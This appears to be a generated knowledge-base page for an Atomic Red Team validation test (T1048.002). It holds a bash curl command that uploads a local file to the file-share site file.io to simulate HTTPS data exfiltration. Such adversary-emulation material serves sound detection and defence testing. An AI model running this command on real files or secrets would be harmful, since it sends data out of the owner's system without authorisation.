---
atomic_guid: "4a4f31e2-46ea-4c26-ad89-f09ad1d5fe01"
title: "Exfiltrate data HTTPS using curl freebsd,linux or macos"
framework: "atomic"
generated: "true"
attack_technique_id: "T1048.002"
attack_technique_name: "Exfiltration Over Alternative Protocol - Exfiltration Over Asymmetric Encrypted Non-C2 Protocol"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1048.002/T1048.002.yaml"
build_date: "2026-04-26 14:38:39"
executor: "bash"
aliases:
  - "4a4f31e2-46ea-4c26-ad89-f09ad1d5fe01"
  - "Exfiltrate data HTTPS using curl freebsd,linux or macos"
platforms:
  - "macos"
  - "linux"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Exfiltrate data HTTPS using curl freebsd,linux or macos

Exfiltrate data HTTPS using curl to file share site file.io

## Metadata

- Atomic GUID: 4a4f31e2-46ea-4c26-ad89-f09ad1d5fe01
- Technique: T1048.002: Exfiltration Over Alternative Protocol - Exfiltration Over Asymmetric Encrypted Non-C2 Protocol
- Platforms: macos, linux
- Executor: bash
- Elevation Required: False
- Source Path: atomics/T1048.002/T1048.002.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1048-exfiltration_over_alternative_protocol|T1048.002]]

## Input Arguments

### input_file

- description: Test file to upload
- type: path
- default: PathToAtomicsFolder/T1048.002/src/artifact

## Executor

- elevation_required: False
- name: bash

### Command

```bash
curl -F 'file=@#{input_file}' -F 'maxDownloads=1' -F 'autoDelete=true' https://file.io/
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1048.002/T1048.002.yaml)
